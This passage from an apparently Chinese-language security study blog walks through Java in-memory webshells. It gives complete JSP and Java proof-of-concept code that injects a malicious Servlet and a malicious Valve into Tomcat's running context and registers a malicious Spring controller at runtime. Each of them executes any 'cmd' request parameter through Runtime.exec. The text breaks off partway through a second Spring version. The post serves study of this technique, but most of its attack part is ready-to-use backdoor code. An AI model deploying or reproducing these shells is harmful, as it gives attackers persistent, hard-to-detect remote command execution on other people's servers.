class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Servlet</span> <span class="keyword">implements</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Shell_Servlet</span> <span class="variable">shell_servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Servlet</span>();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> shell_servlet.getClass().getSimpleName();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    wrapper.setName(name);</span><br><span class="line">    wrapper.setServlet(shell_servlet);</span><br><span class="line">    wrapper.setServletClass(shell_servlet.getClass().getName());</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>,name);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>这里的POC就和上面的分析步骤一模一样</p><p>先将原本的<code>Shell_Servlet.java</code>给注释掉   然后写入<code>Servlet.jsp</code>   然后进行访问</p><p><img src="../images/image-20230802105020798.png" alt="image-20230802105020798"></p><p>然后访问<code>/shell</code>路由  然后直接<code>cmd</code>执行命令</p><p><img src="../images/image-20230802105103102.png" alt="image-20230802105103102"></p><h3 id="Valve型"><a href="#Valve型" class="headerlink" title="Valve型"></a>Valve型</h3><p>在了解Valve之前，我们先来简单了解一下Tomcat中的<code>管道机制</code>。</p><p>我们知道，当Tomcat接收到客户端请求时，首先会使用<code>Connector</code>进行解析，然后发送到<code>Container</code>进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到Servlet进行处理的呢？这里涉及到的机制就是Tomcat管道机制。</p><p>管道机制主要涉及到两个名词，Pipeline（管道）和Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。这里的调用流程可以类比为Filter中的责任链机制</p><p><img src="../images/20220218104446.png" alt="img"></p><p>在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例。</p><p><strong>这里的话还是可以参考这篇文章</strong>    <a href="https://goodapple.top/archives/1359">关于tomcat是怎么运行处理的客户端传进的信息的</a></p><h4 id="管道机制流程分析"><a href="#管道机制流程分析" class="headerlink" title="管道机制流程分析"></a>管道机制流程分析</h4><p>我们先来看看Pipeline接口，继承了Contained接口</p><p><img src="../images/image-20230802113925704.png" alt="image-20230802113925704"></p><p>Pipeline接口提供了各种对Valve的操作方法，如我们可以通过<code>addValve()</code>方法来添加一个Valve。下面我们再来看看Valve接口</p><p><img src="../images/image-20230802114033701.png" alt="image-20230802114033701"></p><p>其中getNext()方法可以用来获取下一个Valve，Valve的调用过程可以理解成类似Filter中的责任链模式，按顺序调用。</p><p><img src="../images/管道机制.jpg" alt="img"></p><p>同时Valve可以通过重写<code>invoke()</code>方法来实现具体的业务逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Shell_Valve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            ...</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>下面我们通过源码看一看，消息在容器之间是如何传递的。首先消息传递到Connector被解析后，在<code>org.apache.catalina.connector.CoyoteAdapter#service</code>方法中</p><p><img src="../images/image-20230802120640820.png" alt="image-20230802120640820"></p><p>前面是对Request和Respone对象进行一些判断及创建操作，我们重点来看一下<code>connector.getService().getContainer().getPipeline().getFirst().invoke(request, response)</code></p><p>首先通过<code>connector.getService()</code>来获取一个StandardService对象</p><p><img src="../images/图片-47.png" alt="img"></p><p>接着通过<code>StandardService</code>.<code>getContainer().getPipeline()</code>获取<code>StandardPipeline</code>对象。</p><p>再通过<code>StandardPipeline.getFirst()</code>获取第一个Valve</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Valve <span class="title function_">getFirst</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (first != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> first;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> basic;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>最后通过调用<code>StandardEngineValve.invoke()</code>来实现Valve的各种业务逻辑</p><p>(<strong>这里调用<code>Engine</code>是因为<code>Engine</code>排第一位)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Select the Host to be used for this Request</span></span><br><span class="line">        <span class="type">Host</span> <span class="variable">host</span> <span class="operator">=</span> request.getHost();</span><br><span class="line">        <span class="keyword">if</span> (host == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// HTTP 0.9 or HTTP 1.0 request without a host when no default host</span></span><br><span class="line">            <span class="comment">// is defined.</span></span><br><span class="line">            <span class="comment">// Don&#x27;t overwrite an existing error</span></span><br><span class="line">            <span class="keyword">if</span> (!response.isError()) &#123;</span><br><span class="line">                response.sendError(<span class="number">404</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (request.isAsyncSupported()) &#123;</span><br><span class="line">            request.setAsyncSupported(host.getPipeline().isAsyncSupported());</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Ask this Host to process this request</span></span><br><span class="line">        host.getPipeline().getFirst().invoke(request, response);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>host.getPipeline().getFirst().invoke(request, response)</code>实现调用后续的Valve。</p><p><strong>(就是调用<code>host</code>自身的<code>Valve</code>)</strong></p><h4 id="动态添加Valve"><a href="#动态添加Valve" class="headerlink" title="动态添加Valve"></a>动态添加Valve</h4><p>根据上文的分析我们能够总结出Valve型内存马的注入思路</p><ol><li>获取<code>StandardContext</code>对象</li><li>通过<code>StandardContext</code>对象获取<code>StandardPipeline</code></li></ol><p><img src="../images/image-20230802120648587.png" alt="image-20230802120648587"></p><p>就是这里来获取到这个<code>StandardPipeline</code>d的  所以我手动添加</p><ol><li><p>编写恶意Valve</p></li><li><p>通过<code>StandardPipeline.addValve()</code>动态添加Valve</p></li></ol><p>这里添加是为了<code>getFirst</code>()的时候能够调用到  并且执行这个传进来的<code>Valve</code>里的<code>invoke</code>方法</p><h5 id="获取StandardContext和StandardPipeline对象"><a href="#获取StandardContext和StandardPipeline对象" class="headerlink" title="获取StandardContext和StandardPipeline对象"></a>获取StandardContext和StandardPipeline对象</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Pipeline</span> <span class="variable">pipeline</span> <span class="operator">=</span> standardContext.getPipeline();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="编写恶意Valve类"><a href="#编写恶意Valve类" class="headerlink" title="编写恶意Valve类"></a>编写恶意Valve类</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Shell_Valve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="将恶意Valve添加进StandardPipeline"><a href="#将恶意Valve添加进StandardPipeline" class="headerlink" title="将恶意Valve添加进StandardPipeline"></a>将恶意Valve添加进StandardPipeline</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Shell_Valve</span> <span class="variable">shell_valve</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Valve</span>();</span><br><span class="line">    pipeline.addValve(shell_valve);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h5 id="完整POC-3"><a href="#完整POC-3" class="headerlink" title="完整POC"></a>完整POC</h5><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Pipeline&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.valves.ValveBase&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Pipeline</span> <span class="variable">pipeline</span> <span class="operator">=</span> standardContext.getPipeline();</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">Shell_Valve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd !=<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NullPointerException n)&#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Shell_Valve</span> <span class="variable">shell_valve</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Valve</span>();</span><br><span class="line">    pipeline.addValve(shell_valve);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><strong>访问<code>Valve.jsp</code>将内存马写入</strong></p><p><img src="../images/image-20230802122012848.png" alt="image-20230802122012848"></p><p><strong>然后直接命令执行就行了</strong></p><p><img src="../images/image-20230802122102870.png" alt="image-20230802122102870"></p><h2 id="Spring内存马"><a href="#Spring内存马" class="headerlink" title="Spring内存马"></a>Spring内存马</h2><p><a href="https://goodapple.top/archives/1355">介绍Spring </a>   这篇文章有介绍<code>Spring</code>的   建议直接去就行  这里就不写了</p><p>关于<strong>Spring内存马</strong>一共有两种类型  就是<code>Controller</code>和<code>Interceptor</code>这两种类型</p><p>这里的就不多写了  因为看不太懂  太绕了</p><p><strong>直接写实现思路了</strong></p><h3 id="Controller型内存马"><a href="#Controller型内存马" class="headerlink" title="Controller型内存马"></a>Controller型内存马</h3><h4 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h4><p>和Tomcat内存马类似，我们就需要了解如何动态的注册Controller，思路如下</p><ol><li>获取上下文环境</li><li>注册恶意Controller</li><li>配置路径映射</li></ol><p><strong>(前面省略了很多步骤没写  可以去看 <a href="https://goodapple.top/archives/1355">这篇文章</a>来加深理解  我没写是因为我单纯看不懂…………………..)</strong></p><h4 id="完整POC-4"><a href="#完整POC-4" class="headerlink" title="完整POC"></a>完整POC</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shell.controller;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">shell_controller</span> &#123;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//    @ResponseBody</span></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/control&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Spring_Controller</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//获取当前上下文环境</span></span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//手动注册Controller</span></span><br><span class="line">        <span class="comment">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span></span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">r</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        <span class="comment">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> Controller_Shell.class.getDeclaredMethod(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line">        <span class="comment">// 3. 定义访问 controller 的 URL 地址</span></span><br><span class="line">        <span class="type">PatternsRequestCondition</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PatternsRequestCondition</span>(<span class="string">&quot;/shell&quot;</span>);</span><br><span class="line">        <span class="comment">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span></span><br><span class="line">        <span class="type">RequestMethodsRequestCondition</span> <span class="variable">ms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMethodsRequestCondition</span>();</span><br><span class="line">        <span class="comment">// 5. 在内存中动态注册 controller</span></span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">info</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>(url, ms, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">        r.registerMapping(info, <span class="keyword">new</span> <span class="title class_">Controller_Shell</span>(), method);</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Controller_Shell</span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Controller_Shell</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shell</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">//获取request</span></span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">            Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是刚访问<code>/control</code>路由的时候会显示未找到  返回404<br><img src="../images/image-20230802165406953.png" alt="image-20230802165406953"></p><p>这样就会将内存马写入进去  </p><p>然后访问<code>/shell</code>执行命令就会成功</p><p><img src="../images/image-20230802165941542.png" alt="image-20230802165941542"></p><p>结束了</p><h5 id="高版本spring内存马-上面是低版本"><a href="#高版本spring内存马-上面是低版本" class="headerlink" title="高版本spring内存马(上面是低版本)"></a>高版本spring内存马(上面是低版本)</h5><h6 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h6><p> <strong>在这篇文章上面用的是<code>spring 5.3.19</code>版本</strong> 对应<code>springboot2.6</code>及以下版本，但是现在<code>SpringBoot</code>已经在<code>3.x</code>版本了，在这种条件下我们该如何去打进内存马呢？</p><h6 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h6><p><img src="../images/image-20230808161149104.png" alt="image-20230808161149104"></p><p>PathPattern改为了<code>AntPathMatcher</code></p><p><strong>其实这里本质上的不同就是在获取这个路由的方法不同</strong></p><p><img src="../images/image-20230808162011536.png" alt="image-20230808162011536"></p><p><img src="../images/image-20230808162422020.png" alt="image-20230808162422020"></p><p>高版本的spring与低版本的差别就是在这了  获取<code>RequestMappingInfo</code>的方法不同(<strong>就是获取路由的方法不同</strong>)</p><p>总的来说就是步骤和这个低版本的spring内存马是一样的  差别只是在这个获取<code>RequestMappingInfo</code>方法</p><h6 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springshell.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line"><span class="keyword">import</span> 